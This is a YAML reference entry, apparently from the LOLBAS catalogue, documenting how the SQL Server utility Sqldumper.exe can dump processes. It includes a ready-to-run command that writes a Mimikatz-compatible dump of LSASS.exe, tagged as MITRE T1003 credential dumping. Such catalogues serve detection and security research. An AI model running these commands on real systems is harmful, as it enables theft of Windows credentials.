---
name: Sqldumper.exe
description: Debugging utility included with Microsoft SQL.
functions:
  dump:
    - description: Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).
      code: sqldumper.exe 464 0 0x0110
      mitreid: T1003
      mitrelink: https://attack.mitre.org/wiki/Technique/T1003
      operatingsystem: Windows
      privileges: Administrator
      usecase: Dump process uisng PID.
    - description: 0x01100:40 flag will create a Mimikatz compatibile dump file.
      code: sqldumper.exe 540 0 0x01100:40
      mitreid: T1003
      mitrelink: https://attack.mitre.org/wiki/Technique/T1003
      operatingsystem: Windows
      privileges: Administrator
      usecase: Dump LSASS.exe to Mimikatz compatable dump uisng PID.
resources:
    - resource: https://twitter.com/countuponsec/status/910969424215232518
    - resource: https://twitter.com/countuponsec/status/910977826853068800
    - resource: https://support.microsoft.com/en-us/help/917825/how-to-use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-se
fullpath:
    - path: C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe
    - path: C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe
detection:
  - IOC: 
acknowledgement:
  - Person: Luis Rocha
    Handle: '@countuponsec'
---
